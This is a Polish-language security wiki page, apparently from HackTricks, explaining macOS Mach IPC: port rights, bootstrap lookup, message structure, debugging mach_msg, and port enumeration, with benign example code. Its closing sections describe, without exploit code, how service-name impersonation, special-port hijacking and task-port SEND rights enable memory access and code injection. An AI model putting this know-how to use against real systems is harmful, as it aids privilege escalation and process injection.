# macOS IPC - Inter Process Communication

{{#include ../../../../banners/hacktricks-training.md}}

## Mach messaging via Ports

### Basic Information

Mach używa **zadań** jako **najmniejszej jednostki** do dzielenia zasobów, a każde zadanie może zawierać **wiele wątków**. Te **zadania i wątki są mapowane 1:1 na procesy i wątki POSIX**.

Komunikacja między zadaniami odbywa się za pomocą Mach Inter-Process Communication (IPC), wykorzystując jednokierunkowe kanały komunikacyjne. **Wiadomości są przesyłane między portami**, które działają jak **kolejki wiadomości** zarządzane przez jądro.

**Port** jest **podstawowym** elementem Mach IPC. Może być używany do **wysyłania wiadomości i ich odbierania**.

Każdy proces ma **tabelę IPC**, w której można znaleźć **porty mach procesu**. Nazwa portu mach to tak naprawdę liczba (wskaźnik do obiektu jądra).

Proces może również wysłać nazwę portu z pewnymi prawami **do innego zadania**, a jądro sprawi, że ten wpis w **tabeli IPC innego zadania** się pojawi.

### Port Rights

Prawa portu, które definiują, jakie operacje zadanie może wykonać, są kluczowe dla tej komunikacji. Możliwe **prawa portu** to ([definicje stąd](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):

- **Prawo odbioru**, które pozwala na odbieranie wiadomości wysyłanych do portu. Porty Mach są kolejkami MPSC (wielu producentów, jeden konsument), co oznacza, że w całym systemie może być tylko **jedno prawo odbioru dla każdego portu** (w przeciwieństwie do rur, gdzie wiele procesów może posiadać deskryptory plików do końca odczytu jednej rury).
- **Zadanie z prawem odbioru** może odbierać wiadomości i **tworzyć prawa wysyłania**, co pozwala mu na wysyłanie wiadomości. Początkowo tylko **własne zadanie ma prawo odbioru nad swoim portem**.
- Jeśli właściciel prawa odbioru **umiera** lub je zabija, **prawo wysyłania staje się bezużyteczne (martwa nazwa)**.
- **Prawo wysyłania**, które pozwala na wysyłanie wiadomości do portu.
- Prawo wysyłania może być **klonowane**, więc zadanie posiadające prawo wysyłania może sklonować to prawo i **przyznać je trzeciemu zadaniu**.
- Należy zauważyć, że **prawa portu** mogą być również **przekazywane** przez wiadomości Mac.
- **Prawo wysyłania raz**, które pozwala na wysłanie jednej wiadomości do portu, a następnie znika.
- To prawo **nie może** być **klonowane**, ale może być **przenoszone**.
- **Prawo zestawu portów**, które oznacza _zestaw portów_ zamiast pojedynczego portu. Usunięcie wiadomości z zestawu portów usuwa wiadomość z jednego z portów, które zawiera. Zestawy portów mogą być używane do nasłuchiwania na kilku portach jednocześnie, podobnie jak `select`/`poll`/`epoll`/`kqueue` w Unixie.
- **Martwa nazwa**, która nie jest rzeczywistym prawem portu, ale jedynie miejscem. Gdy port zostaje zniszczony, wszystkie istniejące prawa portu do portu zamieniają się w martwe nazwy.

**Zadania mogą przekazywać PRAWA WYSYŁANIA innym**, umożliwiając im wysyłanie wiadomości z powrotem. **PRAWA WYSYŁANIA mogą być również klonowane, więc zadanie może zduplikować i przekazać prawo trzeciemu zadaniu**. To, w połączeniu z pośrednim procesem znanym jako **serwer bootstrap**, umożliwia skuteczną komunikację między zadaniami.

### File Ports

Porty plikowe pozwalają na enkapsulację deskryptorów plików w portach Mac (używając praw portu Mach). Możliwe jest utworzenie `fileport` z danego FD za pomocą `fileport_makeport` i utworzenie FD z fileportu za pomocą `fileport_makefd`.

### Establishing a communication

Jak wspomniano wcześniej, możliwe jest wysyłanie praw za pomocą wiadomości Mach, jednak **nie można wysłać prawa bez już posiadania prawa** do wysłania wiadomości Mach. Jak więc nawiązywana jest pierwsza komunikacja?

W tym celu zaangażowany jest **serwer bootstrap** (**launchd** w mac), ponieważ **każdy może uzyskać PRAWO WYSYŁANIA do serwera bootstrap**, możliwe jest poproszenie go o prawo do wysłania wiadomości do innego procesu:

1. Zadanie **A** tworzy **nowy port**, uzyskując **prawo ODBIORU** nad nim.
2. Zadanie **A**, będąc posiadaczem prawa ODBIORU, **generuje PRAWO WYSYŁANIA dla portu**.
3. Zadanie **A** nawiązuje **połączenie** z **serwerem bootstrap** i **wysyła mu PRAWO WYSYŁANIA** dla portu, który wygenerowało na początku.
- Pamiętaj, że każdy może uzyskać PRAWO WYSYŁANIA do serwera bootstrap.
4. Zadanie A wysyła wiadomość `bootstrap_register` do serwera bootstrap, aby **powiązać dany port z nazwą** taką jak `com.apple.taska`
5. Zadanie **B** wchodzi w interakcję z **serwerem bootstrap**, aby wykonać bootstrap **lookup dla nazwy usługi** (`bootstrap_lookup`). Aby serwer bootstrap mógł odpowiedzieć, zadanie B wyśle mu **PRAWO WYSYŁANIA do portu, który wcześniej stworzyło** w wiadomości lookup. Jeśli lookup zakończy się sukcesem, **serwer duplikuje PRAWO WYSYŁANIA** otrzymane od Zadania A i **przekazuje je do Zadania B**.
- Pamiętaj, że każdy może uzyskać PRAWO WYSYŁANIA do serwera bootstrap.
6. Dzięki temu PRAWU WYSYŁANIA, **Zadanie B** jest w stanie **wysłać** **wiadomość** **do Zadania A**.
7. W przypadku komunikacji dwukierunkowej zazwyczaj zadanie **B** generuje nowy port z **PRAWEM ODBIORU** i **PRAWEM WYSYŁANIA**, a następnie przekazuje **PRAWO WYSYŁANIA do Zadania A**, aby mogło wysyłać wiadomości do ZADANIA B (komunikacja dwukierunkowa).

Serwer bootstrap **nie może uwierzytelnić** nazwy usługi, którą zadanie twierdzi, że posiada. Oznacza to, że **zadanie** może potencjalnie **podszywać się pod dowolne zadanie systemowe**, na przykład fałszywie **twierdząc, że ma nazwę usługi autoryzacji** i następnie zatwierdzając każdą prośbę.

Następnie Apple przechowuje **nazwy usług dostarczanych przez system** w zabezpieczonych plikach konfiguracyjnych, znajdujących się w **katalogach chronionych przez SIP**: `/System/Library/LaunchDaemons` i `/System/Library/LaunchAgents`. Obok każdej nazwy usługi, **przechowywana jest również powiązana binarka**. Serwer bootstrap utworzy i zachowa **PRAWO ODBIORU dla każdej z tych nazw usług**.

Dla tych zdefiniowanych usług, **proces lookup różni się nieco**. Gdy nazwa usługi jest wyszukiwana, launchd uruchamia usługę dynamicznie. Nowy przepływ pracy wygląda następująco:

- Zadanie **B** inicjuje bootstrap **lookup** dla nazwy usługi.
- **launchd** sprawdza, czy zadanie działa, a jeśli nie, **uruchamia** je.
- Zadanie **A** (usługa) wykonuje **bootstrap check-in** (`bootstrap_check_in()`). Tutaj serwer **bootstrap** tworzy PRAWO WYSYŁANIA, zachowuje je i **przekazuje PRAWO ODBIORU do Zadania A**.
- launchd duplikuje **PRAWO WYSYŁANIA i wysyła je do Zadania B**.
- Zadanie **B** generuje nowy port z **PRAWEM ODBIORU** i **PRAWEM WYSYŁANIA**, a następnie przekazuje **PRAWO WYSYŁANIA do Zadania A** (usługa), aby mogło wysyłać wiadomości do ZADANIA B (komunikacja dwukierunkowa).

Jednak ten proces dotyczy tylko zdefiniowanych zadań systemowych. Zadania nie-systemowe nadal działają zgodnie z opisem pierwotnym, co może potencjalnie umożliwić podszywanie się.

> [!CAUTION]
> Dlatego launchd nigdy nie powinien się zawieszać, ponieważ cały system się zawiesi.

### A Mach Message

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)

Funkcja `mach_msg`, zasadniczo wywołanie systemowe, jest wykorzystywana do wysyłania i odbierania wiadomości Mach. Funkcja wymaga, aby wiadomość do wysłania była pierwszym argumentem. Ta wiadomość musi zaczynać się od struktury `mach_msg_header_t`, a następnie zawierać rzeczywistą treść wiadomości. Struktura jest zdefiniowana w następujący sposób:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Procesy posiadające _**prawo odbioru**_ mogą odbierać wiadomości na porcie Mach. Z kolei **nadawcy** otrzymują _**prawo wysyłania**_ lub _**prawo wysyłania-jednorazowego**_. Prawo wysyłania-jednorazowego jest przeznaczone wyłącznie do wysyłania pojedynczej wiadomości, po czym staje się nieważne.

Początkowe pole **`msgh_bits`** jest bitmapą:

- Pierwszy bit (najbardziej znaczący) jest używany do wskazania, że wiadomość jest złożona (więcej na ten temat poniżej)
- 3. i 4. bit są używane przez jądro
- **5 najmniej znaczących bitów 2. bajtu** może być używane dla **vouchera**: inny typ portu do wysyłania kombinacji klucz/wartość.
- **5 najmniej znaczących bitów 3. bajtu** może być używane dla **portu lokalnego**
- **5 najmniej znaczących bitów 4. bajtu** może być używane dla **portu zdalnego**

Typy, które mogą być określone w voucherze, portach lokalnych i zdalnych to (z [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Na przykład, `MACH_MSG_TYPE_MAKE_SEND_ONCE` może być użyty do **wskazania**, że **prawo do wysyłania raz** powinno być wyprowadzone i przeniesione dla tego portu. Może być również określone `MACH_PORT_NULL`, aby zapobiec możliwości odpowiedzi przez odbiorcę.

Aby osiągnąć łatwą **komunikację dwukierunkową**, proces może określić **port mach** w nagłówku **wiadomości mach** zwanym _portem odpowiedzi_ (**`msgh_local_port`**), gdzie **odbiorca** wiadomości może **wysłać odpowiedź** na tę wiadomość.

> [!TIP]
> Zauważ, że ten rodzaj komunikacji dwukierunkowej jest używany w wiadomościach XPC, które oczekują na odpowiedź (`xpc_connection_send_message_with_reply` i `xpc_connection_send_message_with_reply_sync`). Ale **zwykle tworzone są różne porty**, jak wyjaśniono wcześniej, aby stworzyć komunikację dwukierunkową.

Inne pola nagłówka wiadomości to:

- `msgh_size`: rozmiar całego pakietu.
- `msgh_remote_port`: port, na który ta wiadomość jest wysyłana.
- `msgh_voucher_port`: [vouchery mach](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: ID tej wiadomości, które jest interpretowane przez odbiorcę.

> [!CAUTION]
> Zauważ, że **wiadomości mach są wysyłane przez `mach port`**, który jest kanałem komunikacyjnym **z jednym odbiorcą** i **wieloma nadawcami** wbudowanym w jądro mach. **Wiele procesów** może **wysyłać wiadomości** do portu mach, ale w danym momencie tylko **jeden proces może z niego odczytać**.

Wiadomości są następnie formowane przez nagłówek **`mach_msg_header_t`**, po którym następuje **treść** i **trailer** (jeśli jest obecny) i może przyznać pozwolenie na odpowiedź. W tych przypadkach jądro musi tylko przekazać wiadomość z jednego zadania do drugiego.

**Trailer** to **informacja dodana do wiadomości przez jądro** (nie może być ustawiona przez użytkownika), która może być żądana przy odbiorze wiadomości z flagami `MACH_RCV_TRAILER_<trailer_opt>` (istnieje różna informacja, która może być żądana).

#### Złożone wiadomości

Jednak istnieją inne, bardziej **złożone** wiadomości, takie jak te przekazujące dodatkowe prawa do portów lub dzielące pamięć, gdzie jądro również musi wysłać te obiekty do odbiorcy. W tych przypadkach najbardziej znaczący bit nagłówka `msgh_bits` jest ustawiony.

Możliwe deskryptory do przekazania są zdefiniowane w [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
W 32 bitach wszystkie deskryptory mają 12B, a typ deskryptora znajduje się w 11. bajcie. W 64 bitach rozmiary się różnią.

> [!CAUTION]
> Jądro skopiuje deskryptory z jednego zadania do drugiego, ale najpierw **tworząc kopię w pamięci jądra**. Ta technika, znana jako "Feng Shui", była nadużywana w kilku exploitach, aby **jądro skopiowało dane w swojej pamięci**, co pozwala procesowi wysyłać deskryptory do siebie. Następnie proces może odbierać wiadomości (jądro je zwolni).
>
> Możliwe jest również **wysłanie praw portu do podatnego procesu**, a prawa portu po prostu pojawią się w procesie (nawet jeśli nie obsługuje ich).

### Mac Ports APIs

Zauważ, że porty są powiązane z przestrzenią nazw zadania, więc aby utworzyć lub wyszukać port, przestrzeń nazw zadania jest również zapytana (więcej w `mach/mach_port.h`):

- **`mach_port_allocate` | `mach_port_construct`**: **Utwórz** port.
- `mach_port_allocate` może również utworzyć **zbiór portów**: prawo odbioru dla grupy portów. Kiedy wiadomość jest odbierana, wskazuje, z którego portu pochodzi.
- `mach_port_allocate_name`: Zmień nazwę portu (domyślnie 32-bitowa liczba całkowita)
- `mach_port_names`: Pobierz nazwy portów z docelowego zadania
- `mach_port_type`: Uzyskaj prawa zadania do nazwy
- `mach_port_rename`: Zmień nazwę portu (jak dup2 dla FD)
- `mach_port_allocate`: Przydziel nowy RECEIVE, PORT_SET lub DEAD_NAME
- `mach_port_insert_right`: Utwórz nowe prawo w porcie, w którym masz RECEIVE
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: Funkcje używane do **wysyłania i odbierania wiadomości mach**. Wersja nadpisująca pozwala określić inny bufor do odbioru wiadomości (inna wersja po prostu go ponownie wykorzysta).

### Debug mach_msg

Ponieważ funkcje **`mach_msg`** i **`mach_msg_overwrite`** są używane do wysyłania i odbierania wiadomości, ustawienie punktu przerwania na nich pozwoli na inspekcję wysyłanych i odbieranych wiadomości.

Na przykład rozpocznij debugowanie dowolnej aplikacji, którą możesz debugować, ponieważ załaduje **`libSystem.B`, która użyje tej funkcji**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 &#x3C;+0>:  pacibsp
0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
</code></pre>

Aby uzyskać argumenty **`mach_msg`**, sprawdź rejestry. Oto argumenty (z [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Pobierz wartości z rejestrów:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Sprawdź nagłówek wiadomości, sprawdzając pierwszy argument:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Ten typ `mach_msg_bits_t` jest bardzo powszechny, aby umożliwić odpowiedź.

### Enumerate ports
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
**nazwa** to domyślna nazwa przypisana do portu (sprawdź, jak **wzrasta** w pierwszych 3 bajtach). **`ipc-object`** to **zaburzony** unikalny **identyfikator** portu.\
Zauważ również, jak porty z tylko prawem **`send`** **identyfikują właściciela** (nazwa portu + pid).\
Zauważ także użycie **`+`** do wskazania **innych zadań połączonych z tym samym portem**.

Możliwe jest również użycie [**procesxp**](https://www.newosxbook.com/tools/procexp.html), aby zobaczyć również **zarejestrowane nazwy usług** (z wyłączonym SIP z powodu potrzeby `com.apple.system-task-port`):
```
procesp 1 ports
```
Możesz zainstalować to narzędzie w iOS, pobierając je z [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Przykład kodu

Zauważ, jak **nadawca** **przydziela** port, tworzy **prawo do wysyłania** dla nazwy `org.darlinghq.example` i wysyła je do **serwera bootstrap**, podczas gdy nadawca prosił o **prawo do wysyłania** tej nazwy i użył go do **wysłania wiadomości**.

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Porty uprzywilejowane

Istnieją specjalne porty, które pozwalają na **wykonywanie pewnych wrażliwych działań lub uzyskiwanie dostępu do pewnych wrażliwych danych**, jeśli zadania mają uprawnienia **SEND** do nich. Czyni to te porty bardzo interesującymi z perspektywy atakującego, nie tylko ze względu na możliwości, ale także dlatego, że możliwe jest **dzielenie się uprawnieniami SEND między zadaniami**.

### Specjalne porty hosta

Te porty są reprezentowane przez numer.

Prawa **SEND** można uzyskać, wywołując **`host_get_special_port`**, a prawa **RECEIVE** wywołując **`host_set_special_port`**. Jednak oba wywołania wymagają portu **`host_priv`**, do którego ma dostęp tylko root. Co więcej, w przeszłości root mógł wywołać **`host_set_special_port`** i przejąć dowolny port, co pozwalało na przykład na ominięcie podpisów kodu poprzez przejęcie `HOST_KEXTD_PORT` (SIP teraz temu zapobiega).

Są one podzielone na 2 grupy: **pierwsze 7 portów jest własnością jądra**, a są to 1 `HOST_PORT`, 2 `HOST_PRIV_PORT`, 3 `HOST_IO_MASTER_PORT`, a 7 to `HOST_MAX_SPECIAL_KERNEL_PORT`.\
Porty zaczynające się **od** numeru **8** są **własnością demonów systemowych** i można je znaleźć zadeklarowane w [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html).

- **Port hosta**: Jeśli proces ma uprawnienia **SEND** do tego portu, może uzyskać **informacje** o **systemie**, wywołując jego rutyny, takie jak:
- `host_processor_info`: Uzyskaj informacje o procesorze
- `host_info`: Uzyskaj informacje o hoście
- `host_virtual_physical_table_info`: Tabela stron wirtualnych/fizycznych (wymaga MACH_VMDEBUG)
- `host_statistics`: Uzyskaj statystyki hosta
- `mach_memory_info`: Uzyskaj układ pamięci jądra
- **Port Priv hosta**: Proces z prawem **SEND** do tego portu może wykonywać **uprzywilejowane działania**, takie jak wyświetlanie danych rozruchowych lub próba załadowania rozszerzenia jądra. **Proces musi być rootem**, aby uzyskać to uprawnienie.
- Co więcej, aby wywołać API **`kext_request`**, potrzebne są inne uprawnienia **`com.apple.private.kext*`**, które są przyznawane tylko binarkom Apple.
- Inne rutyny, które można wywołać, to:
- `host_get_boot_info`: Uzyskaj `machine_boot_info()`
- `host_priv_statistics`: Uzyskaj uprzywilejowane statystyki
- `vm_allocate_cpm`: Przydziel kontygentową pamięć fizyczną
- `host_processors`: Wyślij prawo do procesorów hosta
- `mach_vm_wire`: Uczyń pamięć rezydentną
- Ponieważ **root** może uzyskać dostęp do tego uprawnienia, może wywołać `host_set_[special/exception]_port[s]`, aby **przejąć specjalne lub wyjątkowe porty hosta**.

Możliwe jest **zobaczenie wszystkich specjalnych portów hosta** poprzez uruchomienie:
```bash
procexp all ports | grep "HSP"
```
### Task Special Ports

Są to porty zarezerwowane dla dobrze znanych usług. Można je uzyskać/ustawić, wywołując `task_[get/set]_special_port`. Można je znaleźć w `task_special_ports.h`:
```c
typedef	int	task_special_port_t;

#define TASK_KERNEL_PORT	1	/* Represents task to the outside
world.*/
#define TASK_HOST_PORT		2	/* The host (priv) port for task.  */
#define TASK_BOOTSTRAP_PORT	4	/* Bootstrap environment for task. */
#define TASK_WIRED_LEDGER_PORT	5	/* Wired resource ledger for task. */
#define TASK_PAGED_LEDGER_PORT	6	/* Paged resource ledger for task. */
```
- **TASK_KERNEL_PORT**\[task-self send right]: Port używany do kontrolowania tego zadania. Używany do wysyłania wiadomości, które wpływają na zadanie. To jest port zwracany przez **mach_task_self (patrz poniżej Task Ports)**.
- **TASK_BOOTSTRAP_PORT**\[bootstrap send right]: Port bootstrap zadania. Używany do wysyłania wiadomości z prośbą o zwrot innych portów usług systemowych.
- **TASK_HOST_NAME_PORT**\[host-self send right]: Port używany do żądania informacji o zawierającym hoście. To jest port zwracany przez **mach_host_self**.
- **TASK_WIRED_LEDGER_PORT**\[ledger send right]: Port wskazujący źródło, z którego to zadanie pobiera swoją pamięć jądra.
- **TASK_PAGED_LEDGER_PORT**\[ledger send right]: Port wskazujący źródło, z którego to zadanie pobiera swoją domyślną pamięć zarządzaną.

### Task Ports

Początkowo Mach nie miał "procesów", miał "zadania", które były uważane za bardziej kontener wątków. Gdy Mach został połączony z BSD, **każde zadanie było skorelowane z procesem BSD**. Dlatego każdy proces BSD ma szczegóły, których potrzebuje, aby być procesem, a każde zadanie Mach ma również swoje wewnętrzne działanie (z wyjątkiem nieistniejącego pid 0, który jest `kernel_task`).

Istnieją dwie bardzo interesujące funkcje związane z tym:

- `task_for_pid(target_task_port, pid, &task_port_of_pid)`: Uzyskaj prawo SEND dla portu zadania związanego z określonym przez `pid` i przekaż je do wskazanego `target_task_port` (który zazwyczaj jest zadaniem wywołującym, które użyło `mach_task_self()`, ale może być portem SEND w innym zadaniu).
- `pid_for_task(task, &pid)`: Mając prawo SEND do zadania, znajdź, do którego PID to zadanie jest związane.

Aby wykonać działania w ramach zadania, zadanie potrzebowało prawa `SEND` do siebie, wywołując `mach_task_self()` (które używa `task_self_trap` (28)). Z tym uprawnieniem zadanie może wykonać kilka działań, takich jak:

- `task_threads`: Uzyskaj prawo SEND do wszystkich portów zadań wątków zadania
- `task_info`: Uzyskaj informacje o zadaniu
- `task_suspend/resume`: Wstrzymaj lub wznowić zadanie
- `task_[get/set]_special_port`
- `thread_create`: Utwórz wątek
- `task_[get/set]_state`: Kontroluj stan zadania
- i więcej można znaleźć w [**mach/task.h**](https://github.com/phracker/MacOSX-SDKs/blob/master/MacOSX11.3.sdk/System/Library/Frameworks/Kernel.framework/Versions/A/Headers/mach/task.h)

> [!CAUTION]
> Zauważ, że mając prawo SEND do portu zadania **innego zadania**, możliwe jest wykonanie takich działań na innym zadaniu.

Ponadto, port task_port jest również portem **`vm_map`**, który pozwala na **odczyt i manipulację pamięcią** wewnątrz zadania za pomocą funkcji takich jak `vm_read()` i `vm_write()`. To zasadniczo oznacza, że zadanie z prawami SEND do portu task_port innego zadania będzie mogło **wstrzyknąć kod do tego zadania**.

